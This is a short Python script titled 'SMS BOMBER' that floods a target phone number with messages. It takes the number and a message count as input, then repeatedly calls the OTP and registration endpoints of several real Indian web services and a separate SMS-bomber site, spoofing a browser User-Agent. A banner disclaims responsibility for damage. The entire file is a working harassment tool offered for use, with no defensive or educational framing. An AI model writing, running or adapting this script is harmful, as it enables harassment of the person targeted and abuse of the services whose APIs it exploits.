import requests
import time


print(" ***********************SMS BOMBER \n BY LUFFY1105 \n  Note : I won't be responsible for any damage caused by this script, Use at your own risk ")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36'}


def bomb(num, count, slep):
    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=", "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=",
            "http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=", "https://www.oyorooms.com/api/pwa/generateotp?phone=", "https://students.byjus.com/mobiles/request_otp?mobile=%2B91-"]
    data = {"phone": num}
    url2 = ["https://smsbomber.info/?number="]
    x = y = z = 0
    for y in range(0, 4):
        for x in url1:
            print("Target Number          : ", num)
            print("Number of Message Sent : ", y+1)
            result_url = str(x)+num
            requests.get(result_url, headers=headers)
            time.sleep(slep)
            y = y+1
    for y in range(4, int(count)):
        for x in url2:
            print("Target Number          : ", num)
            print("Number of Message Sent : ", y+1)
            result_url = str(x)+num
            requests.get(result_url, headers=headers)
            time.sleep(slep)


bomb(input("Enter Target Number : "), input("Enter Number of Messages : "), 1)
